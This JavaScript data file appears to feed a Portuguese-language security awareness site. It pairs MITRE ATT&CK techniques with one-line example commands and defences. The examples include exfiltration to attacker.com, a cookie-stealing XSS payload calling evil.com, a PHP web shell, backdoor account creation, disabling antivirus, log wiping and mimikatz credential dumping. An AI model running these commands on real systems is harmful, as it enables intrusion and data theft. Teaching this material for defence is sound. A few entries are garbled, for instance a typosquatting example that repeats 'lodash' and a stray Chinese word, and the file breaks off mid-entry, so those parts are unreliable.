window.TECNICAS_DATA = {
    "attacks": [
        {
            "name": "Active Scanning",
            "icon": "fa-radar",
            "mitre": "T1595",
            "simple": "O hacker varre redes ativamente para descobrir portas abertas, servi\u00e7os rodando e vulnerabilidades. Como um ladr\u00e3o verificando todas as portas e janelas de uma casa.",
            "example": "nmap -sV -sC -A -T4 192.168.1.0/24",
            "defense": "Configurar IDS/IPS para detectar scans. Rate limiting. Firewall com logging detalhado."
        },
        {
            "name": "Vulnerability Scanning",
            "icon": "fa-search",
            "mitre": "T1595.002",
            "simple": "Scanners autom\u00e1ticos que identificam vulnerabilidades conhecidas (CVE). O hacker usa ferramentas como Nessus ou OpenVAS para encontrar falhas no sistema.",
            "example": "nessuscli scan --target 10.0.0.1 --policy \"Full Audit\"",
            "defense": "Manter sistemas atualizados. Remediar vulnerabilidades cr\u00edticas em 24-48h. Segmentar rede."
        },
        {
            "name": "Phishing for Information",
            "icon": "fa-fish",
            "mitre": "T1598",
            "simple": "Emails ou mensagens direcionadas para coletar informa\u00e7\u00f5es confidenciais. O hacker pesquisa a v\u00edtima antes para criar mensagens convincentes.",
            "example": "Spearphishing: \"Ol\u00e1 Jo\u00e3o, segue o documento que pediu\" - attachment malicioso",
            "defense": "Treinamento de phishing simulado. An\u00e1lise de anexos. MFA para todas as contas."
        },
        {
            "name": "Exploit Public-Facing App",
            "icon": "fa-window-maximize",
            "mitre": "T1190",
            "simple": "Explorar vulnerabilidades em aplica\u00e7\u00f5es web expostas na internet. SQLi, XSS, RCE em servidores web, VPNs, RDPs.",
            "example": "curl \"http://alvo.com/page?id=1' OR 1=1--\"",
            "defense": "WAF. Patch management. Hardening de servidores. Rate limiting."
        },
        {
            "name": "External Remote Services",
            "icon": "fa-desktop",
            "mitre": "T1133",
            "simple": "Acessar servi\u00e7os remotos expostos como VPN, RDP, Citrix, VDI. O hacker tenta credenciais vazadas ou for\u00e7a bruta.",
            "example": "hydra -L users.txt -P rockyou.txt rdp://alvo.com",
            "defense": "MFA obrigat\u00f3rio para todos os servi\u00e7os remotos. Network Level Authentication (NLA)."
        },
        {
            "name": "Valid Accounts",
            "icon": "fa-user-check",
            "mitre": "T1078",
            "simple": "Usar credenciais v\u00e1lidas comprometidas para acesso. Pode ser conta default, local, domain ou cloud.",
            "example": "Cracked admin@empresa.com \u2192 acesso total ao sistema",
            "defense": "MFA. Credential hygiene. Monitorar login an\u00f4malo. Privileged Access Management (PAM)."
        },
        {
            "name": "Phishing",
            "icon": "fa-envelope",
            "mitre": "T1566",
            "simple": "Enviar emails fraudulentos com anexos ou links maliciosos. Spearphishing (alto valor), Whaling (executivos).",
            "example": "Email \"urgent-invoice.pdf.exe\" \u2192 malware",
            "defense": "DMARC/SPF/DKIM. Sandbox de email. Treinamento. Analista de phishing."
        },
        {
            "name": "Drive-by Compromise",
            "icon": "fa-car-crash",
            "mitre": "T1189",
            "simple": "O usu\u00e1rio visita site comprometido que entrega malware automaticamente via exploit kit ou JavaScript malicioso.",
            "example": "Script malicioso em site hackeado \u2192 download de payload sem clique",
            "defense": "EDR. Browser isolation. Patch de navegadores. DNS filtering."
        },
        {
            "name": "Supply Chain Compromise",
            "icon": "fa-truck",
            "mitre": "T1195",
            "simple": "Comprometer software ou hardware antes de chegar ao usu\u00e1rio. Biblioteca npm maliciosa, atualiza\u00e7\u00e3o fake, hardware adulterado.",
            "example": "npm package \"lodash\" \u2192 \"lodash\" (typosquatting) com c\u00f3digo malicioso",
            "defense": "SCA. Verificar integridade de depend\u00eancias. SBOM (Software Bill of Materials)."
        },
        {
            "name": "Command and Scripting",
            "icon": "fa-terminal",
            "mitre": "T1059",
            "simple": "Executar comandos ou scripts maliciosos no sistema. PowerShell, Bash, Python, VBA, JavaScript.",
            "example": "powershell -enc JABjAGQAMgA... (encoded command)",
            "defense": "Applocker. Constrained Language Mode. Script blocking. Monitorar PowerShell."
        },
        {
            "name": "User Execution",
            "icon": "fa-user-play",
            "mitre": "T1204",
            "simple": "Usu\u00e1rio induzido a executar malware. Clique em link malicioso ou abertura de arquivo infectado.",
            "example": "documento.pdf.exe (double extension)",
            "defense": "User training. Extension blocking. Disable macro execution."
        },
        {
            "name": "Scheduled Task/Job",
            "icon": "fa-clock",
            "mitre": "T1053",
            "simple": "Criar tarefas agendadas para execu\u00e7\u00e3o persistente. Windows Task Scheduler, Linux at/cron.",
            "example": "schtasks /create /tn \"Update\" /tr \"malware.exe\" /sc daily",
            "defense": "Audit scheduled tasks. Restringir cria\u00e7\u00e3o de tarefas. EDR monitoring."
        },
        {
            "name": "System Services",
            "icon": "fa-cogs",
            "mitre": "T1569",
            "simple": "Executar c\u00f3digo como servi\u00e7o do sistema. Criar ou modificar servi\u00e7os Windows para persist\u00eancia.",
            "example": "sc create \"SecurityUpdate\" binPath= \"C:malware.exe\"",
            "defense": "Service auditing. Least Privilege. Windows Defender Application Control."
        },
        {
            "name": "Registry Run Keys",
            "icon": "fa-database",
            "mitre": "T1547.001",
            "simple": "Adicionar entrada no registro para executar malware no startup. HKCUSoftwareMicrosoftWindowsCurrentVersionRun.",
            "example": "reg add \"HKCUSoftwareMicrosoftWindowsCurrentVersionRun\" /v Update /t REG_SZ /d malware.exe",
            "defense": "Audit registry changes. Windows Defender. Restringir acesso ao registro."
        },
        {
            "name": "Web Shell",
            "icon": "fa-globe",
            "mitre": "T1505.003",
            "simple": "Backdoor em servidor web que permite execu\u00e7\u00e3o remota de comandos. Arquivo PHP/ASP/JSP malicioso.",
            "example": "<?php system($_GET[\"cmd\"]); ?>",
            "defense": "File integrity monitoring. WAF. Regular penetration testing."
        },
        {
            "name": "Create Account",
            "icon": "fa-user-plus",
            "mitre": "T1136",
            "simple": "Criar conta local ou de dom\u00ednio para acesso persistente. Conta fake com privil\u00e9gios.",
            "example": "net user backdoor /add && net localgroup Administrators backdoor /add",
            "defense": "Monitor account creation. PAM. Just-in-Time admin access."
        },
        {
            "name": "Scheduled Task Persistence",
            "icon": "fa-calendar-check",
            "mitre": "T1053",
            "simple": "Tarefa agendada que executa malware periodicamente. Sobrevive reinicializa\u00e7\u00f5es.",
            "example": "powershell -Command \"Register-ScheduledTask -TaskName Update -Trigger...\"",
            "defense": "Audit scheduled tasks. Restringir usu\u00e1rios que podem criar tarefas."
        },
        {
            "name": "Exploitation for Priv Esc",
            "icon": "fa-arrow-up",
            "mitre": "T1068",
            "simple": "Explorar vulnerabilidade local para ganhar privil\u00e9gios elevados. Kernel exploit, configura\u00e7\u00e3o errada.",
            "example": "Dirty COW (CVE-2016-5195) \u2192 root",
            "defense": "Patch management. ASLR. Least Privilege. EDR."
        },
        {
            "name": "Process Injection",
            "icon": "fa-syringe",
            "mitre": "T1055",
            "simple": "Injetar c\u00f3digo em processo leg\u00edtimo para esconder execu\u00e7\u00e3o. DLL injection, Process hollowing.",
            "example": "mimikatz \"sekurlsa::logonpasswords\" \u2192 injetar em LSASS",
            "defense": "EDR. Disable SeDebugPrivilege. Monitor process creation."
        },
        {
            "name": "Access Token Manipulation",
            "icon": "fa-id-card",
            "mitre": "T1134",
            "simple": " roubar ou manipular tokens de acesso. Token stealing, impersonation, SID-History injection.",
            "example": "impersonate token \u2192 SeImpersonatePrivilege",
            "defense": "Restringir privil\u00e9gios. Monitor token requests. Credential Guard."
        },
        {
            "name": "SUID/SGID Exploitation",
            "icon": "fa-key",
            "mitre": "T1548.001",
            "simple": "Explorar bin\u00e1rios SUID/SGID para ganhar root. Bin\u00e1rio com permiss\u00f5es incorretas.",
            "example": "chmod +s /usr/bin/vuln-bin \u2192 ./vuln-bin \u2192 root",
            "defense": "Audit SUID files. Remove unnecessary SUID. File integrity monitoring."
        },
        {
            "name": "Obfuscated Files",
            "icon": "fa-mask",
            "mitre": "T1027",
            "simple": "Ofuscar arquivos ou informa\u00e7\u00e3o. Packing, esteganografia, criptografia de payloads.",
            "example": "UPX packed malware \u2192 signature bypass",
            "defense": "EDR. Deobfuscation tools. Behavioral analysis."
        },
        {
            "name": "Disable Security Tools",
            "icon": "fa-ban",
            "mitre": "T1562.001",
            "simple": "Desabilitar ferramentas de seguran\u00e7a. Parar AV, EDR, firewall, desabilitar logging.",
            "example": "Set-MpPreference -DisableRealtimeMonitoring $true",
            "defense": "Tamper protection. Audit security tool status."
        },
        {
            "name": "Indicator Removal",
            "icon": "fa-eraser",
            "mitre": "T1070",
            "simple": "Remover evid\u00eancias de ataque. Limpar logs, apagar arquivos, modificar timestamps.",
            "example": "wevtutil cl Security \u2192 clear Windows event logs",
            "defense": "Centralized logging. Immutable logs. SIEM."
        },
        {
            "name": "Masquerading",
            "icon": "fa-disguise",
            "mitre": "T1036",
            "simple": "Disfar\u00e7ar malware como arquivo ou processo leg\u00edtimo. Renomear ferramentas, usar nomes de sistema.",
            "example": "malware.exe \u2192 svchost.exe",
            "defense": "File integrity monitoring. EDR. Code signing verification."
        },
        {
            "name": "LOLBin Execution",
            "icon": "fa-box",
            "mitre": "T1218",
            "simple": "Usar bin\u00e1rios leg\u00edtimos para executar c\u00f3digo malicioso. Mshta, Rundll32, Regsvr32, Certutil.",
            "example": "mshta vbscript:Execute(\"malicious code\")",
            "defense": "AppLocker. Disable or restrict LOLBins. ASR rules."
        },
        {
            "name": "OS Credential Dumping",
            "icon": "fa-vault",
            "mitre": "T1003",
            "simple": "Extrair credenciais do sistema operacional. LSASS, SAM, NTDS.dit, LSA Secrets.",
            "example": "mimikatz \"sekurlsa::logonpasswords\"",
            "defense": "Credential Guard. Disable WDigest. Limit admin rights."
        },
        {
            "name": "Kerberos Attacks",
            "icon": "fa-crown",
            "mitre": "T1558",
            "simple": "Attacks contra Kerberos: Golden Ticket, Silver Ticket, Kerberoasting, AS-REP Roasting.",
            "example": "mimikatz \"kerberos::golden /domain:corp.com /krbtgt:hash\"",
            "defense": "Protected Users group. Credential Guard. Monitor TGT requests."
        },
        {
            "name": "Brute Force",
            "icon": "fa-fist-raised",
            "mitre": "T1110",
            "simple": "Tentativas autom\u00e1ticas de login. Password spraying, credential stuffing.",
            "example": "hydra -L users.txt -P passwords.txt ssh://alvo.com",
            "defense": "MFA. Account lockout policy. CAPTCHA. IP blocking."
        },
        {
            "name": "Credentials from Browser",
            "icon": "fa-browser",
            "mitre": "T1555.003",
            "simple": "Roubar credenciais salvas em navegadores. Chrome, Firefox, Edge.",
            "example": "SharpChrome cookies/passwords",
            "defense": "Disable password storage. EDR. Browser security policies."
        },
        {
            "name": "Account Discovery",
            "icon": "fa-users",
            "mitre": "T1087",
            "simple": "Enumerar contas de usu\u00e1rio. Local, dom\u00ednio, email, cloud.",
            "example": "net user /domain \u2192 list all domain users",
            "defense": "Audit enumeration. Limit account info exposure."
        },
        {
            "name": "File and Directory Discovery",
            "icon": "fa-folder-open",
            "mitre": "T1083",
            "simple": "Explorar sistema de arquivos. Procurar arquivos sens\u00edveis, configura\u00e7\u00f5es.",
            "example": "find / -name \"*.conf\" -o -name \"*.pem\"",
            "defense": "File integrity monitoring. Least Privilege file access."
        },
        {
            "name": "System Information Discovery",
            "icon": "fa-info",
            "mitre": "T1082",
            "simple": "Coletar informa\u00e7\u00f5es do sistema. SO, vers\u00e3o, arquitetura, hostname.",
            "example": "systeminfo \u2192 Windows version, hotfixes",
            "defense": "Limit system info exposure. EDR."
        },
        {
            "name": "Network Service Discovery",
            "icon": "fa-network-wired",
            "mitre": "T1046",
            "simple": "Descobrir servi\u00e7os de rede. Port scanning, enumera\u00e7\u00e3o de servi\u00e7os.",
            "example": "nmap -sV 192.168.1.0/24",
            "defense": "Network segmentation. IDS/IPS."
        },
        {
            "name": "Pass-the-Hash",
            "icon": "fa-exchange-alt",
            "mitre": "T1550.002",
            "simple": "Usar hash NTLM para autentica\u00e7\u00e3o sem conhecer a senha. Movimenta\u00e7\u00e3o lateral.",
            "example": "mimikatz \"sekurlsa::pth /user:admin /ntlm:hash\"",
            "defense": "Credential Guard. Disable NTLM. Protected Users group."
        },
        {
            "name": "Remote SSH/Telnet",
            "icon": "fa-terminal",
            "mitre": "T1021.004",
            "simple": "Acesso remoto via SSH/Telnet a sistemas comprometidos.",
            "example": "ssh hacker@alvo.com",
            "defense": "Key-based auth only. MFA. Audit connections."
        },
        {
            "name": "WMI Execution",
            "icon": "fa-microchip",
            "mitre": "T1021.003",
            "simple": "Usar WMI para executar c\u00f3digo em sistemas remotos.",
            "example": "wmic /node:target process call create \"malware.exe\"",
            "defense": "Disable WMI subscription. Audit WMI usage."
        },
        {
            "name": "SMB Lateral Movement",
            "icon": "fa-folder-share",
            "mitre": "T1021.002",
            "simple": "Usar SMB para mover lateralmente. PsExec, WMI, Scheduled tasks via SMB.",
            "example": "psexec \\target -u user -p pass cmd",
            "defense": "Disable SMBv1. Network segmentation. SMB signing."
        },
        {
            "name": "Screen Capture",
            "icon": "fa-camera",
            "mitre": "T1056.002",
            "simple": "Capturar screenshots do sistema infectado.",
            "example": "powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen.Bmp\"",
            "defense": "EDR. Restringir screenshot APIs."
        },
        {
            "name": "Keylogging",
            "icon": "fa-keyboard",
            "mitre": "T1056.001",
            "simple": "Capturar teclas digitadas. Hardware ou software keylogger.",
            "example": "mimikatz \"log keystroke\"",
            "defense": "EDR. Secure input handling. Hardware controls."
        },
        {
            "name": "Data Exfiltration",
            "icon": "fa-upload",
            "mitre": "T1041",
            "simple": "Extrair dados do ambiente comprometido. HTTP, DNS, FTP, cloud storage.",
            "example": "curl -X POST -d @data.zip http://attacker.com/exfil",
            "defense": "DLP. Network monitoring. Data classification."
        },
        {
            "name": "DNS Exfiltration",
            "icon": "fa-dns",
            "mitre": "T1041",
            "simple": "Exfiltrar dados via queries DNS. Subdomain tunneling.",
            "example": "data.attacker.com \u2192 encoded data in subdomain",
            "defense": "DNS monitoring. DNS firewall. Tunneling detection."
        },
        {
            "name": "Ransomware",
            "icon": "fa-skull-crossbones",
            "mitre": "T1486",
            "simple": "Criptografar dados e exigir resgate. Encryption ransomware, doxing ransomware.",
            "example": "LockBit, Conti, REvil \u2192 arquivos .locked",
            "defense": "Backups imut\u00e1veis. EDR. Segmenta\u00e7\u00e3o. User training."
        },
        {
            "name": "Data Destruction",
            "icon": "fa-trash-alt",
            "mitre": "T1485",
            "simple": "Destruir dados deliberadamente. Wiper malware.",
            "example": "shred -n 3 -z -u file \u2192 destructive delete",
            "defense": "Backups offline. Immutable storage. Access controls."
        },
        {
            "name": "Service Stop",
            "icon": "fa-stop-circle",
            "mitre": "T1489",
            "simple": "Parar servi\u00e7os cr\u00edticos. Interrup\u00e7\u00e3o de opera\u00e7\u00f5es.",
            "example": "stop-service -Name \"SQL Server\"",
            "defense": "Service monitoring. Redundancy. Access controls."
        },
        {
            "name": "SQL Injection (SQLi)",
            "icon": "fa-database",
            "mitre": "T1190",
            "simple": "Injetar comandos SQL em inputs de usu\u00e1rio. Union-based, Blind, Time-based.",
            "example": "' UNION SELECT username,password FROM users--",
            "defense": "Prepared Statements. Input validation. WAF."
        },
        {
            "name": "Cross-Site Scripting (XSS)",
            "icon": "fa-code",
            "mitre": "T1059.007",
            "simple": "Injetar scripts JavaScript maliciosos em p\u00e1ginas web. Reflected, Stored, DOM.",
            "example": "<script>fetch(\"http://evil.com?c=\"+document.cookie)</script>",
            "defense": "Output encoding. CSP. HttpOnly cookies."
        },
        {
            "name": "IDOR",
            "icon": "fa-user-lock",
            "mitre": "T1078",
            "simple": "Acessar dados de outros usu\u00e1rios manipulando IDs.",
            "example": "/profile?id=1 \u2192 /profile?id=2",
            "defense": "Authorization checks. Indirect object references."
        },
        {
            "name": "CSRF",
            "icon": "fa-sync",
            "mitre": "T1185",
            "simple": "For\u00e7ar a\u00e7\u00f5es autenticadas sem consentimento do usu\u00e1rio.",
            "example": "<img src=\"https://bank.com/transfer?to=hacker&amount=10000\">",
            "defense": "CSRF tokens. SameSite cookies. Origin header."
        },
        {
            "name": "XXE",
            "icon": "fa-file-code",
            "mitre": "T1190",
            "simple": "Explorar parsers XML inseguros. Ler arquivos, SSRF, DoS.",
            "example": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
            "defense": "Disable external entities. JSON over XML."
        },
        {
            "name": "Path Traversal",
            "icon": "fa-folder-tree",
            "mitre": "T1083",
            "simple": "Navegar diret\u00f3rios usando ../ para acessar arquivos n\u00e3o autorizados.",
            "example": "../../../../etc/passwd",
            "defense": "Input validation. Chroot jail. Least privilege."
        },
        {
            "name": "Insecure Deserialization",
            "icon": "fa-box-open",
            "mitre": "T1059",
            "simple": "Explorar deserializa\u00e7\u00e3o insegura. Pickle, YAML, Java serialized.",
            "example": "O:4:\"User\":1:{s:5:\"admin\";b:1;}",
            "defense": "Validate schema. Use safe serializers. Integrity checks."
        },
        {
            "name": "SSRF",
            "icon": "fa-server",
            "mitre": "T1552.005",
            "simple": "Fazer servidor fazer requisi\u00e7\u00f5es para recursos internos.",
            "example": "http://169.254.169.254/latest/meta-data/",
            "defense": "Whitelist. Block internal IPs. IMDSv2."
        },
        {
            "name": "Broken Auth",
            "icon": "fa-lock-open",
            "mitre": "T1078",
            "simple": "Falhas em autentica\u00e7\u00e3o e gerenciamento de sess\u00e3o.",
            "example": "Session fixation, weak password policy",
            "defense": "MFA. Session rotation. Secure session management."
        },
        {
            "name": "Security Misconfiguration",
            "icon": "fa-cog",
            "mitre": "T1083",
            "simple": "Configura\u00e7\u00f5es inseguras default. Debug enabled, default creds.",
            "example": "/admin console, /phpinfo.php, default admin:admin",
            "defense": "Hardening guides. Regular audits. Patch configuration."
        },
        {
            "name": "Sensitive Data Exposure",
            "icon": "fa-exclamation-triangle",
            "mitre": "T1041",
            "simple": "Dados sens\u00edveis expostos sem criptografia adequada.",
            "example": "Passwords in plain text in DB",
            "defense": "Encryption at rest. TLS. Data classification."
        },
        {
            "name": "Insecure Components",
            "icon": "fa-puzzle-piece",
            "mitre": "T1195",
            "simple": "Componentes vulner\u00e1veis conhecidos em uso.",
            "example": "Log4Shell (CVE-2021-44228)",
            "defense": "SCA. Dependency scanning. Patch management."
        },
        {
            "name": "Insufficient Logging",
            "icon": "fa-list-alt",
            "mitre": "T1562",
            "simple": "Falha em detectar e responder a incidentes em tempo real.",
            "example": "No login failure logging",
            "defense": "Centralized logging. SIEM. Alerting."
        },
        {
            "name": "Cloud Misconfiguration",
            "icon": "fa-cloud",
            "mitre": "T1530",
            "simple": "Configura\u00e7\u00f5es erradas em cloud. S3 bucket p\u00fablico, IAM permiss\u00f5es excessivas.",
            "example": "aws s3 ls s3://empresa-backup --no-sign-request \u2192 public access!",
            "defense": "CSPM. Cloud security posture management. Regular audits."
        },
        {
            "name": "Cloud Metadata Exposed",
            "icon": "fa-cloud-upload-alt",
            "mitre": "T1552.005",
            "simple": "Acessar metadata cloud via SSRF. Credenciais, tokens, instance info.",
            "example": "curl http://169.254.169.254/latest/meta-data/",
            "defense": "IMDSv2. Network filtering. Disable IMDS where possible."
        },
        {
            "name": "Container Escape",
            "icon": "fa-boxes",
            "mitre": "T1611",
            "simple": "Escapar do container para o host. Container break-out.",
            "example": "docker run --privileged \u2192 mount host filesystem",
            "defense": "Rootless containers. Seccomp. AppArmor/SELinux."
        },
        {
            "name": "Mobile App Vulnerabilities",
            "icon": "fa-mobile",
            "mitre": "T1426",
            "simple": "Vulnerabilidades em apps Android/iOS. Insecure storage, hardcoded keys.",
            "example": "SharedPreferences in plain text \u2192 credentials exposed",
            "defense": "OWASP MASVS. Code obfuscation. Certificate pinning."
        },
        {
            "name": "Intent/Broadcast Hijacking",
            "icon": "fa-bullhorn",
            "mitre": "T1426",
            "simple": "Interceptar intents ou broadcasts mal configurados no Android.",
            "example": "adb shell am broadcast -a android.intent.action.BOOT_COMPLETED",
            "defense": "Explicit intents. Permission checks. Export=false."
        },
        {
            "name": "ARP Spoofing",
            "icon": "fa-project-diagram",
            "mitre": "T1040",
            "simple": "Enviar respostas ARP falsas para interceptar tr\u00e1fego (MITM).",
            "example": "arpspoof -i eth0 -t 192.168.1.10 192.168.1.1",
            "defense": "Dynamic ARP inspection. 802.1X. Port security."
        },
        {
            "name": "DNS Poisoning",
            "icon": "fa-dns",
            "mitre": "T1584",
            "simple": "Corromper cache DNS para redirecionar tr\u00e1fego.",
            "example": "dnsspoof -i eth0 host 192.168.1.10",
            "defense": "DNSSEC. DNS filtering. Secure DNS servers."
        },
        {
            "name": "WiFi Eavesdropping",
            "icon": "fa-wifi",
            "mitre": "T1040",
            "simple": "Capturar tr\u00e1fego em redes WiFi n\u00e3o seguras.",
            "example": "airmon-ng start wlan0 \u2192 airodump-ng",
            "defense": "WPA3. VPN. HTTPS only."
        },
        {
            "name": "Rogue AP",
            "icon": "fa-wifi",
            "mitre": "T1584",
            "simple": "Cria\u00e7\u00e3o de ponto de acesso falso para capturar dados.",
            "example": "hostapd-wpe \u2192 fake corporate WiFi",
            "defense": "Certificate pinning. Network authentication."
        },
        {
            "name": "Phishing",
            "icon": "fa-fish",
            "mitre": "T1566",
            "simple": "Emails fraudulentos para roubar credenciais ou instalar malware.",
            "example": "\"Seu banco precisa verificar identidade\" \u2192 fake login page",
            "defense": "Email filtering. User training. MFA."
        },
        {
            "name": "Vishing",
            "icon": "fa-phone",
            "mitre": "T1566",
            "simple": "Phishing via liga\u00e7\u00e3o telef\u00f4nica. \"Suporte t\u00e9cnico\" pedindo acesso.",
            "example": "\"Ol\u00e1, somos do suporte Microsoft, vamos acessar seu PC\"",
            "defense": "Verification protocols. Call back policies."
        },
        {
            "name": "Pretexting",
            "icon": "fa-mask",
            "mitre": "T1566",
            "simple": "Criar cen\u00e1rio falso para obter informa\u00e7\u00f5es. SE passar por colega, fornecedor.",
            "example": "\"Sou do TI, preciso verificar sua senha para manuten\u00e7\u00e3o\"",
            "defense": "Verification. Need-to-know. Security culture."
        },
        {
            "name": "Baiting",
            "icon": "fa-bait",
            "mitre": "T1189",
            "simple": "Isca com dispositivo ou arquivo infectado. USB drop, download free.",
            "example": "USB \"Salary Plan 2024.pdf.exe\" left in parking lot",
            "defense": "Endpoint controls. User awareness. Disable auto-run."
        },
        {
            "name": "Weak Cryptography",
            "icon": "fa-unlock-alt",
            "mitre": "T1600",
            "simple": "Usar algoritmos criptogr\u00e1ficos fracos ou implementa\u00e7\u00f5es incorretas.",
            "example": "MD5 for passwords, DES encryption, ECB mode",
            "defense": "Use strong algorithms (AES-256, RSA-4096). Proper key management."
        },
        {
            "name": "Credential Stuffing",
            "icon": "fa-users-cog",
            "mitre": "T1110",
            "simple": "Usar credenciais vazadas em outros servi\u00e7os (reuso de senha).",
            "example": "combo list \u2192 try in Netflix, Gmail, Facebook",
            "defense": "Unique passwords per service. MFA. Password managers."
        },
        {
            "name": "USB Attacks",
            "icon": "fa-usb",
            "mitre": "T1091",
            "simple": "Ataques via dispositivo USB. BadUSB, Rubber Ducky, keylogger.",
            "example": "Rubber Ducky \u2192 keystroke injection \u2192 reverse shell",
            "defense": "Disable USB ports. Device control. Physical security."
        },
        {
            "name": "Physical Security Breach",
            "icon": "fa-building",
            "mitre": "T1078",
            "simple": "Acesso f\u00edsico n\u00e3o autorizado a instala\u00e7\u00f5es ou equipamentos.",
            "example": "Tailgating \u2192 server room access",
            "defense": "Access controls. CCTV. Visitor logs. Badge system."
        },
        {
            "name": "RFID Cloning",
            "icon": "fa-id-card",
            "mitre": "T1646",
            "simple": "Clonar cart\u00f5es de acesso RFID.",
            "example": "Proxmark3 \u2192 clone HID card",
            "defense": "Dual authentication. Biometrics. Access logging."
        }
    ],
    "defenses": [
        {
            "name": "MITRE ATT&CK",
            "icon": "fa-chess",
            "color": "primary",
            "simple": "Framework que cataloga TTPs (Tactics, Techniques, Procedures) de advers\u00e1rios. 14 t\u00e1ticas, ~250+ t\u00e9cnicas.",
            "protects": "Threat intelligence, red teaming, detection engineering"
        },
        {
            "name": "MITRE D3FEND",
            "icon": "fa-shield-virus",
            "color": "success",
            "simple": "Framework defensivo que mapeia contramedidas contra t\u00e9cnicas ATT&CK. 267+ t\u00e9cnicas defensivas.",
            "protects": "Defense planning, security architecture"
        },
        {
            "name": "NIST CSF 2.0",
            "icon": "fa-balance-scale",
            "color": "info",
            "simple": "Cybersecurity Framework: Govern, Identify, Protect, Detect, Respond, Recover.",
            "protects": "Risk management, compliance, security program"
        },
        {
            "name": "PTES",
            "icon": "fa-list-check",
            "color": "warning",
            "simple": "Penetration Testing Execution Standard: 7 fases de um pentest profissional.",
            "protects": "Structured penetration testing"
        },
        {
            "name": "OWASP Top 10",
            "icon": "fa-warning",
            "color": "danger",
            "simple": "Top 10 riscos de seguran\u00e7a em aplica\u00e7\u00f5es web mais cr\u00edticos.",
            "protects": "Web application security"
        },
        {
            "name": "CIS Controls v8",
            "icon": "fa-shield-halved",
            "color": "secondary",
            "simple": "18 controles priorit\u00e1rios para defesa cibern\u00e9tica. Implementa\u00e7\u00e3o priorizada.",
            "protects": "Baseline security controls"
        },
        {
            "name": "WAF \u2014 Web Application Firewall",
            "icon": "fa-shield-alt",
            "color": "info",
            "simple": "Filtra tr\u00e1fego HTTP malicioso. Bloqueia SQLi, XSS, LFI, SSRF antes do servidor.",
            "protects": "SQLi, XSS, LFI, SSRF, XXE, RCE via web"
        },
        {
            "name": "IPS/IDS",
            "icon": "fa-radar",
            "color": "warning",
            "simple": "Sistema de detec\u00e7\u00e3o/preven\u00e7\u00e3o de intrus\u00e3o. Analisa padr\u00f5es de tr\u00e1fego.",
            "protects": "Port scanning, brute force, DDoS, exploits"
        },
        {
            "name": "EDR \u2014 Endpoint Detection",
            "icon": "fa-laptop-medical",
            "color": "danger",
            "simple": "Monitora endpoints para comportamento suspeito. Resposta a amea\u00e7as em tempo real.",
            "protects": "Malware, ransomware, lateral movement, fileless attacks"
        },
        {
            "name": "SIEM",
            "icon": "fa-chart-line",
            "color": "primary",
            "simple": "Centraliza logs de toda a infraestrutura. Correlaciona eventos para detec\u00e7\u00e3o.",
            "protects": "Threat detection, incident response, compliance"
        },
        {
            "name": "MFA \u2014 Autentica\u00e7\u00e3o Multifator",
            "icon": "fa-mobile-screen-button",
            "color": "success",
            "simple": "Segundo fator de autentica\u00e7\u00e3o. Algo que voc\u00ea sabe (senha) + algo que voc\u00ea tem (token).",
            "protects": "Credential theft, brute force, phishing"
        },
        {
            "name": "Zero Trust",
            "icon": "fa-lock",
            "color": "primary",
            "simple": "\"Nunca confie, sempre verifique.\" Todo acesso \u00e9 validado, independente de localiza\u00e7\u00e3o.",
            "protects": "Lateral movement, insider threats, compromised credentials"
        },
        {
            "name": "SASE \u2014 Secure Access Service Edge",
            "icon": "fa-cloud",
            "color": "info",
            "simple": "Converge rede e seguran\u00e7a em cloud. SWG, CASB, ZTNA, FWaaS.",
            "protects": "Remote access, cloud security, branch office"
        },
        {
            "name": "ZTNA \u2014 Zero Trust Network Access",
            "icon": "fa-network",
            "color": "success",
            "simple": "Acesso remoto seguro baseado em identidade, n\u00e3o rede.\u53d6\u4ee3 VPN.",
            "protects": "Remote access, data exfiltration, unauthorized access"
        },
        {
            "name": "Encryption at Rest",
            "icon": "fa-file-shield",
            "color": "warning",
            "simple": "Criptografar dados armazenados. BitLocker, LUKS, TDE.",
            "protects": "Data theft, physical theft, unauthorized access"
        },
        {
            "name": "Encryption in Transit",
            "icon": "fa-lock",
            "color": "success",
            "simple": "TLS 1.3 para comunica\u00e7\u00f5es. Certificados v\u00e1lidos.",
            "protects": "MITM, sniffing, data interception"
        },
        {
            "name": "HSTS \u2014 HTTP Strict Transport",
            "icon": "fa-lock",
            "color": "info",
            "simple": "For\u00e7a navegador a usar sempre HTTPS. Impede SSL stripping.",
            "protects": "Downgrade attacks, cookie hijacking"
        },
        {
            "name": "Certificate Pinning",
            "icon": "fa-certificate",
            "color": "warning",
            "simple": "Associar certificado espec\u00edfico a um dom\u00ednio. Impede MITM com certificados falsos.",
            "protects": "MITM, rogue CAs"
        },
        {
            "name": "Hashing de Senhas",
            "icon": "fa-hashtag",
            "color": "danger",
            "simple": "bcrypt, scrypt, Argon2 para armazenamento de senhas. Nunca MD5/SHA1.",
            "protects": "Credential database breach"
        },
        {
            "name": "CSP \u2014 Content Security Policy",
            "icon": "fa-file-code",
            "color": "warning",
            "simple": "Define quais recursos podem ser carregados. Bloqueia scripts n\u00e3o autorizados.",
            "protects": "XSS, clickjacking, data injection"
        },
        {
            "name": "Input Validation",
            "icon": "fa-filter",
            "color": "info",
            "simple": "Validar e sanitizar toda entrada de usu\u00e1rio. Whitelist prefer\u00edvel a blacklist.",
            "protects": "Injection attacks, XSS, path traversal"
        },
        {
            "name": "Parameterized Queries",
            "icon": "fa-database",
            "color": "danger",
            "simple": "Prepared Statements para evitar SQL injection. Nunca concatenar SQL.",
            "protects": "SQL injection"
        },
        {
            "name": "Output Encoding",
            "icon": "fa-code",
            "color": "warning",
            "simple": "Codificar sa\u00edda antes de renderizar. Prevenir XSS.",
            "protects": "XSS (reflected, stored)"
        },
        {
            "name": "Secure Session Management",
            "icon": "fa-id-card",
            "color": "info",
            "simple": "Session IDs seguros, timeout, HttpOnly, Secure flags.",
            "protects": "Session hijacking, fixation"
        },
        {
            "name": "CORS \u2014 Cross Origin Resource",
            "icon": "fa-share-nodes",
            "color": "warning",
            "simple": "Controlar quais dom\u00ednios podem acessar recursos. Configura\u00e7\u00e3o restritiva.",
            "protects": "CSRF, data leakage"
        },
        {
            "name": "Network Segmentation",
            "icon": "fa-network-wired",
            "color": "info",
            "simple": "Separar rede em VLANs. Isolar sistemas cr\u00edticos.",
            "protects": "Lateral movement, data exfiltration"
        },
        {
            "name": "Firewall",
            "icon": "fa-fire",
            "color": "danger",
